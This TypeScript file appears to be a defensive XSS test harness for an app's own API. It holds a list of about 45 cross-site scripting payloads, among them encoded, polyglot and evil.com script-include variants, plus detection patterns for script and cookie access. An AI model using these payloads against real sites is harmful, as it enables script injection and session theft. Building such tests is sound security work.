import { TestReporter } from '../reporting/test-reporter'

export interface TestEnvironment {
  baseUrl: string
  makeRequest: (path: string, options?: RequestInit) => Promise<Response>
}

export interface XSSTestResult {
  testName: string
  status: 'pass' | 'fail' | 'skip'
  duration: number
  error?: string
  details?: Record<string, any>
}

export interface XSSPayloadTest {
  payload: string
  description: string
  category: 'script' | 'event' | 'url' | 'html' | 'css' | 'unicode' | 'encoded'
  severity: 'critical' | 'high' | 'medium' | 'low'
}

/**
 * Comprehensive XSS Testing Framework
 * Tests various XSS attack vectors and validates prevention mechanisms
 */
export class XSSTestingFramework {
  private testEnv: TestEnvironment
  private reporter: TestReporter
  private results: XSSTestResult[] = []

  constructor(testEnv: TestEnvironment, reporter: TestReporter) {
    this.testEnv = testEnv
    this.reporter = reporter
  }

  /**
   * Comprehensive XSS payload database
   */
  private getXSSPayloads(): XSSPayloadTest[] {
    return [
      // Basic script injection
      {
        payload: '<script>alert("XSS")</script>',
        description: 'Basic script tag injection',
        category: 'script',
        severity: 'critical'
      },
      {
        payload: '<SCRIPT>alert("XSS")</SCRIPT>',
        description: 'Uppercase script tag',
        category: 'script',
        severity: 'critical'
      },
      {
        payload: '<script src="http://evil.com/xss.js"></script>',
        description: 'External script inclusion',
        category: 'script',
        severity: 'critical'
      },
      {
        payload:
          '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
        description: 'Encoded script execution',
        category: 'script',
        severity: 'critical'
      },

      // Event handler injection
      {
        payload: '<img src=x onerror=alert("XSS")>',
        description: 'Image onerror event handler',
        category: 'event',
        severity: 'high'
      },
      {
        payload: '<body onload=alert("XSS")>',
        description: 'Body onload event handler',
        category: 'event',
        severity: 'high'
      },
      {
        payload: '<svg onload=alert("XSS")>',
        description: 'SVG onload event handler',
        category: 'event',
        severity: 'high'
      },
      {
        payload: '<input onfocus=alert("XSS") autofocus>',
        description: 'Input onfocus with autofocus',
        category: 'event',
        severity: 'high'
      },
      {
        payload: '<select onfocus=alert("XSS") autofocus><option>test</option></select>',
        description: 'Select onfocus with autofocus',
        category: 'event',
        severity: 'high'
      },
      {
        payload: '<textarea onfocus=alert("XSS") autofocus></textarea>',
        description: 'Textarea onfocus with autofocus',
        category: 'event',
        severity: 'high'
      },
      {
        payload: '<keygen onfocus=alert("XSS") autofocus>',
        description: 'Keygen onfocus with autofocus',
        category: 'event',
        severity: 'high'
      },
      {
        payload: '<video><source onerror="alert(\'XSS\')">',
        description: 'Video source onerror',
        category: 'event',
        severity: 'high'
      },
      {
        payload: '<audio src=x onerror=alert("XSS")>',
        description: 'Audio onerror event',
        category: 'event',
        severity: 'high'
      },

      // JavaScript URL schemes
      {
        payload: 'javascript:alert("XSS")',
        description: 'JavaScript URL scheme',
        category: 'url',
        severity: 'high'
      },
      {
        payload: 'JaVaScRiPt:alert("XSS")',
        description: 'Mixed case JavaScript URL',
        category: 'url',
        severity: 'high'
      },
      {
        payload: 'vbscript:msgbox("XSS")',
        description: 'VBScript URL scheme',
        category: 'url',
        severity: 'high'
      },
      {
        payload: 'data:text/html,<script>alert("XSS")</script>',
        description: 'Data URL with HTML',
        category: 'url',
        severity: 'high'
      },

      // HTML injection
      {
        payload: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        description: 'Iframe with JavaScript URL',
        category: 'html',
        severity: 'critical'
      },
      {
        payload: '<object data="javascript:alert(\'XSS\')">',
        description: 'Object with JavaScript data',
        category: 'html',
        severity: 'critical'
      },
      {
        payload: '<embed src="javascript:alert(\'XSS\')">',
        description: 'Embed with JavaScript source',
        category: 'html',
        severity: 'critical'
      },
      {
        payload: '<applet code="javascript:alert(\'XSS\')">',
        description: 'Applet with JavaScript code',
        category: 'html',
        severity: 'critical'
      },
      {
        payload: '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
        description: 'Meta refresh with JavaScript',
        category: 'html',
        severity: 'high'
      },
      {
        payload: '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
        description: 'Link with JavaScript href',
        category: 'html',
        severity: 'high'
      },

      // CSS injection
      {
        payload: '<style>body{background:url("javascript:alert(\'XSS\')")}</style>',
        description: 'CSS with JavaScript URL',
        category: 'css',
        severity: 'medium'
      },
      {
        payload: '<div style="background:url(javascript:alert(\'XSS\'))">',
        description: 'Inline CSS with JavaScript',
        category: 'css',
        severity: 'medium'
      },
      {
        payload: '<style>@import"javascript:alert(\'XSS\')";</style>',
        description: 'CSS import with JavaScript',
        category: 'css',
        severity: 'medium'
      },
      {
        payload: '<style>body{-moz-binding:url("javascript:alert(\'XSS\')")}</style>',
        description: 'CSS binding with JavaScript',
        category: 'css',
        severity: 'medium'
      },

      // Unicode and encoding attacks
      {
        payload:
          '<script>\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0022\\u0058\\u0053\\u0053\\u0022)</script>',
        description: 'Unicode encoded script',
        category: 'unicode',
        severity: 'high'
      },
      {
        payload: '<script>\\x61\\x6c\\x65\\x72\\x74(\\x22\\x58\\x53\\x53\\x22)</script>',
        description: 'Hex encoded script',
        category: 'unicode',
        severity: 'high'
      },
      {
        payload: '&#60;script&#62;alert(&#34;XSS&#34;)&#60;/script&#62;',
        description: 'HTML entity encoded script',
        category: 'encoded',
        severity: 'high'
      },
      {
        payload: '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
        description: 'Named HTML entity script',
        category: 'encoded',
        severity: 'high'
      },
      {
        payload: '%3Cscript%3Ealert(%22XSS%22)%3C/script%3E',
        description: 'URL encoded script',
        category: 'encoded',
        severity: 'high'
      },

      // Advanced and evasion techniques
      {
        payload: '<script>setTimeout("alert(\'XSS\')",1000)</script>',
        description: 'Delayed execution via setTimeout',
        category: 'script',
        severity: 'high'
      },
      {
        payload: '<script>setInterval("alert(\'XSS\')",1000)</script>',
        description: 'Repeated execution via setInterval',
        category: 'script',
        severity: 'high'
      },
      {
        payload: '<script>Function("alert(\'XSS\')")()</script>',
        description: 'Function constructor execution',
        category: 'script',
        severity: 'high'
      },
      {
        payload: '<script>[].constructor.constructor("alert(\'XSS\')")()</script>',
        description: 'Constructor chain execution',
        category: 'script',
        severity: 'high'
      },
      {
        payload: '"><script>alert("XSS")</script>',
        description: 'Attribute breaking injection',
        category: 'script',
        severity: 'critical'
      },
      {
        payload: "';alert('XSS');//",
        description: 'JavaScript context breaking',
        category: 'script',
        severity: 'critical'
      },
      {
        payload: '</script><script>alert("XSS")</script>',
        description: 'Script tag breaking',
        category: 'script',
        severity: 'critical'
      },

      // Template injection
      {
        payload: '{{alert("XSS")}}',
        description: 'Template literal injection',
        category: 'script',
        severity: 'medium'
      },
      {
        payload: '${alert("XSS")}',
        description: 'Template string injection',
        category: 'script',
        severity: 'medium'
      },
      {
        payload: '#{alert("XSS")}',
        description: 'Hash template injection',
        category: 'script',
        severity: 'medium'
      },

      // Polyglot payloads
      {
        payload:
          'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert("XSS")//\'>',
        description: 'Polyglot XSS payload',
        category: 'script',
        severity: 'critical'
      },
      {
        payload: '"><img src=x onerror=alert("XSS")>',
        description: 'Attribute breaking with image',
        category: 'event',
        severity: 'high'
      }
    ]
  }

  /**
   * Test endpoints that accept user input
   */
  private getTestEndpoints(): Array<{
    path: string
    method: string
    payloadLocation: 'body' | 'query' | 'param'
    bodyTemplate?: any
    requiresAuth?: boolean
  }> {
    return [
      // Query parameter tests
      {
        path: '/api/health',
        method: 'GET',
        payloadLocation: 'query'
      },
      {
        path: '/api/appointments',
        method: 'GET',
        payloadLocation: 'query'
      },

      // Body parameter tests (require auth)
      {
        path: '/api/marketing/campaigns',
        method: 'POST',
        payloadLocation: 'body',
        bodyTemplate: { name: 'PAYLOAD', description: 'Test campaign' },
        requiresAuth: true
      },
      {
        path: '/api/pos/sales',
        method: 'POST',
        payloadLocation: 'body',
        bodyTemplate: { items: [{ name: 'PAYLOAD', quantity: 1, unitPrice: 10 }] },
        requiresAuth: true
      },
      {
        path: '/api/loyalty/entries',
        method: 'POST',
        payloadLocation: 'body',
        bodyTemplate: { customerId: 'test', type: 'earned', points: 10, note: 'PAYLOAD' },
        requiresAuth: true
      },
      {
        path: '/api/demo/seed',
        method: 'POST',
        payloadLocation: 'body',
        bodyTemplate: { scenario: 'PAYLOAD' },
        requiresAuth: true
      },

      // URL parameter tests
      {
        path: '/api/staff/PAYLOAD',
        method: 'GET',
        payloadLocation: 'param'
      },
      {
        path: '/api/services/PAYLOAD',
        method: 'GET',
        payloadLocation: 'param'
      }
    ]
  }

  /**
   * Run comprehensive XSS tests
   */
  async runAllTests(): Promise<XSSTestResult[]> {
    this.results = []

    await this.testXSSPrevention()
    await this.testInputSanitization()
    await this.testOutputEncoding()
    await this.testCSPEffectiveness()

    return this.results
  }

  /**
   * Test XSS prevention across all endpoints and payload types
   */
  private async testXSSPrevention(): Promise<void> {
    const testName = 'Comprehensive XSS Prevention Testing'
    const startTime = Date.now()

    try {
      const payloads = this.getXSSPayloads()
      const endpoints = this.getTestEndpoints()
      const testResults: any[] = []
      let criticalFailures = 0
      let highSeverityFailures = 0

      for (const endpoint of endpoints) {
        for (const payloadTest of payloads) {
          try {
            let response: Response
            const payload = payloadTest.payload

            if (endpoint.payloadLocation === 'query') {
              const url = `${endpoint.path}?test=${encodeURIComponent(payload)}`
              response = await this.testEnv.makeRequest(url, {
                method: endpoint.method
              })
            } else if (endpoint.payloadLocation === 'body' && endpoint.bodyTemplate) {
              const body = JSON.parse(JSON.stringify(endpoint.bodyTemplate))
              this.injectPayloadIntoObject(body, payload)

              const headers: Record<string, string> = {
                'Content-Type': 'application/json'
              }

              // Add auth header if required (using admin token from environment)
              if (endpoint.requiresAuth) {
                headers['Authorization'] = 'Bearer admin'
              }

              response = await this.testEnv.makeRequest(endpoint.path, {
                method: endpoint.method,
                headers,
                body: JSON.stringify(body)
              })
            } else if (endpoint.payloadLocation === 'param') {
              const url = endpoint.path.replace('PAYLOAD', encodeURIComponent(payload))
              response = await this.testEnv.makeRequest(url, {
                method: endpoint.method
              })
            } else {
              continue
            }

            const responseText = await response.text()
            const isBlocked = this.isXSSBlocked(response, responseText, payload)

            testResults.push({
              endpoint: `${endpoint.method} ${endpoint.path}`,
              payload: payload.substring(0, 50) + (payload.length > 50 ? '...' : ''),
              payloadLocation: endpoint.payloadLocation,
              category: payloadTest.category,
              severity: payloadTest.severity,
              status: response.status,
              blocked: isBlocked,
              responseLength: responseText.length,
              containsPayload: responseText.includes(payload)
            })

            // Count failures by severity
            if (!isBlocked) {
              if (payloadTest.severity === 'critical') {
                criticalFailures++
              } else if (payloadTest.severity === 'high') {
                highSeverityFailures++
              }
            }
          } catch (error) {
            testResults.push({
              endpoint: `${endpoint.method} ${endpoint.path}`,
              payload: payloadTest.payload.substring(0, 50),
              payloadLocation: endpoint.payloadLocation,
              category: payloadTest.category,
              severity: payloadTest.severity,
              status: 'error',
              blocked: true, // Errors are considered blocked
              error: error instanceof Error ? error.message : String(error)
            })
          }
        }
      }

      // Determine overall test result
      const totalTests = testResults.length
      const blockedTests = testResults.filter((r) => r.blocked).length
      const blockingRate = (blockedTests / totalTests) * 100

      if (criticalFailures > 0) {
        throw new Error(
          `Critical XSS vulnerabilities found: ${criticalFailures} critical, ${highSeverityFailures} high severity`
        )
      }

      if (blockingRate < 95) {
        throw new Error(
          `XSS blocking rate too low: ${blockingRate.toFixed(1)}% (minimum 95% required)`
        )
      }

      this.results.push({
        testName,
        status: 'pass',
        duration: Date.now() - startTime,
        details: {
          totalTests,
          blockedTests,
          blockingRate: blockingRate.toFixed(1),
          criticalFailures,
          highSeverityFailures,
          testResults: testResults.slice(0, 20), // First 20 for brevity
          payloadCategories: this.summarizeByCategory(testResults)
        }
      })
    } catch (error) {
      this.results.push({
        testName,
        status: 'fail',
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error)
      })
    }
  }

  /**
   * Test input sanitization effectiveness
   */
  private async testInputSanitization(): Promise<void> {
    const testName = 'Input Sanitization Validation'
    const startTime = Date.now()

    try {
      const sanitizationTests = [
        {
          input: '<script>alert("test")</script>',
          expectedBehavior: 'sanitized',
          description: 'Script tags should be sanitized'
        },
        {
          input: '<img src=x onerror=alert("test")>',
          expectedBehavior: 'sanitized',
          description: 'Event handlers should be sanitized'
        },
        {
          input: 'javascript:alert("test")',
          expectedBehavior: 'sanitized',
          description: 'JavaScript URLs should be sanitized'
        },
        {
          input: 'Normal text content',
          expectedBehavior: 'preserved',
          description: 'Normal text should be preserved'
        },
        {
          input: '   whitespace   ',
          expectedBehavior: 'trimmed',
          description: 'Whitespace should be trimmed'
        },
        {
          input: '',
          expectedBehavior: 'handled',
          description: 'Empty strings should be handled'
        }
      ]

      const testResults = []

      for (const test of sanitizationTests) {
        try {
          // Test with marketing campaign creation
          const response = await this.testEnv.makeRequest('/api/marketing/campaigns', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              Authorization: 'Bearer admin'
            },
            body: JSON.stringify({
              name: test.input,
              description: 'Sanitization test'
            })
          })

          let responseData = null
          try {
            responseData = await response.json()
          } catch {
            // Response might not be JSON
          }

          const isProperlyHandled = this.validateSanitization(
            test.input,
            test.expectedBehavior,
            response,
            responseData
          )

          testResults.push({
            input: test.input,
            expectedBehavior: test.expectedBehavior,
            description: test.description,
            status: response.status,
            properlyHandled: isProperlyHandled,
            responseData
          })
        } catch (error) {
          testResults.push({
            input: test.input,
            expectedBehavior: test.expectedBehavior,
            description: test.description,
            status: 'error',
            properlyHandled: true, // Errors are acceptable for malicious input
            error: error instanceof Error ? error.message : String(error)
          })
        }
      }

      const improperlyHandled = testResults.filter((r) => !r.properlyHandled)

      if (improperlyHandled.length > 0) {
        throw new Error(`Input sanitization failures: ${improperlyHandled.length} tests failed`)
      }

      this.results.push({
        testName,
        status: 'pass',
        duration: Date.now() - startTime,
        details: {
          testResults,
          totalTests: testResults.length,
          properlyHandled: testResults.filter((r) => r.properlyHandled).length
        }
      })
    } catch (error) {
      this.results.push({
        testName,
        status: 'fail',
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error)
      })
    }
  }

  /**
   * Test output encoding effectiveness
   */
  private async testOutputEncoding(): Promise<void> {
    const testName = 'Output Encoding Validation'
    const startTime = Date.now()

    try {
      // Test that responses properly encode potentially dangerous content
      const response = await this.testEnv.makeRequest('/api/health')
      const responseText = await response.text()

      // Check for proper Content-Type header
      const contentType = response.headers.get('Content-Type')
      const hasProperContentType =
        contentType?.includes('application/json') || contentType?.includes('text/plain')

      // Check that response doesn't contain unencoded HTML
      const containsUnescapedHTML = /<[^>]*>/.test(responseText) && !responseText.includes('&lt;')

      if (!hasProperContentType) {
        throw new Error('Response missing proper Content-Type header')
      }

      this.results.push({
        testName,
        status: 'pass',
        duration: Date.now() - startTime,
        details: {
          contentType,
          hasProperContentType,
          containsUnescapedHTML,
          responseLength: responseText.length
        }
      })
    } catch (error) {
      this.results.push({
        testName,
        status: 'fail',
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error)
      })
    }
  }

  /**
   * Test Content Security Policy effectiveness
   */
  private async testCSPEffectiveness(): Promise<void> {
    const testName = 'Content Security Policy Validation'
    const startTime = Date.now()

    try {
      const response = await this.testEnv.makeRequest('/api/health')
      const cspHeader = response.headers.get('Content-Security-Policy')

      if (!cspHeader) {
        throw new Error('Content-Security-Policy header is missing')
      }

      // Validate CSP directives
      const requiredDirectives = [
        'default-src',
        'script-src',
        'style-src',
        'img-src',
        'connect-src',
        'frame-ancestors'
      ]

      const missingDirectives = requiredDirectives.filter(
        (directive) => !cspHeader.includes(directive)
      )

      if (missingDirectives.length > 0) {
        throw new Error(`CSP missing required directives: ${missingDirectives.join(', ')}`)
      }

      // Check for unsafe directives
      const unsafePatterns = ['unsafe-eval', '*', 'data:', 'unsafe-inline']

      const foundUnsafe = unsafePatterns.filter((pattern) => cspHeader.includes(pattern))

      this.results.push({
        testName,
        status: 'pass',
        duration: Date.now() - startTime,
        details: {
          cspHeader,
          requiredDirectives,
          missingDirectives,
          foundUnsafe,
          isStrict: foundUnsafe.length === 0
        }
      })
    } catch (error) {
      this.results.push({
        testName,
        status: 'fail',
        duration: Date.now() - startTime,
        error: error instanceof Error ? error.message : String(error)
      })
    }
  }

  /**
   * Helper method to inject payload into object recursively
   */
  private injectPayloadIntoObject(obj: any, payload: string): void {
    for (const key in obj) {
      if (typeof obj[key] === 'string' && obj[key] === 'PAYLOAD') {
        obj[key] = payload
      } else if (typeof obj[key] === 'object' && obj[key] !== null) {
        this.injectPayloadIntoObject(obj[key], payload)
      }
    }
  }

  /**
   * Determine if XSS payload was properly blocked
   */
  private isXSSBlocked(response: Response, responseText: string, payload: string): boolean {
    // Check if request was rejected (good)
    if (response.status === 400 || response.status === 403 || response.status === 422) {
      return true
    }

    // Check if server crashed (bad)
    if (response.status >= 500) {
      return false
    }

    // Check if payload appears unescaped in response (bad)
    if (responseText.includes(payload)) {
      return false
    }

    // Check for common XSS indicators in response
    const xssIndicators = [
      '<script',
      'javascript:',
      'onerror=',
      'onload=',
      'eval(',
      'alert(',
      'document.cookie'
    ]

    for (const indicator of xssIndicators) {
      if (responseText.toLowerCase().includes(indicator.toLowerCase())) {
        return false
      }
    }

    return true
  }

  /**
   * Validate that input sanitization worked as expected
   */
  private validateSanitization(
    input: string,
    expectedBehavior: string,
    response: Response,
    responseData: any
  ): boolean {
    switch (expectedBehavior) {
      case 'sanitized':
        // Malicious input should be rejected, sanitized, or cause auth failure
        return (
          response.status === 400 ||
          response.status === 401 ||
          response.status === 422 ||
          !this.containsMaliciousContent(responseData)
        )

      case 'preserved':
        // Normal content should be accepted (but might fail auth)
        return response.status === 200 || response.status === 201 || response.status === 401 // Auth failure is acceptable

      case 'trimmed':
        // Whitespace should be handled appropriately (but might fail auth)
        return response.status === 200 || response.status === 201 || response.status === 401 // Auth failure is acceptable

      case 'handled':
        // Empty input should be handled gracefully
        return response.status !== 500

      default:
        return true
    }
  }

  /**
   * Check if response data contains malicious content
   */
  private containsMaliciousContent(data: any): boolean {
    if (!data) return false

    const dataStr = JSON.stringify(data).toLowerCase()
    const maliciousPatterns = ['<script', 'javascript:', 'onerror=', 'onload=', 'eval(', 'alert(']

    return maliciousPatterns.some((pattern) => dataStr.includes(pattern))
  }

  /**
   * Summarize test results by payload category
   */
  private summarizeByCategory(testResults: any[]): Record<string, any> {
    const categories: Record<string, any> = {}

    for (const result of testResults) {
      if (!categories[result.category]) {
        categories[result.category] = {
          total: 0,
          blocked: 0,
          failed: 0
        }
      }

      categories[result.category].total++
      if (result.blocked) {
        categories[result.category].blocked++
      } else {
        categories[result.category].failed++
      }
    }

    return categories
  }

  getResults(): XSSTestResult[] {
    return this.results
  }
}
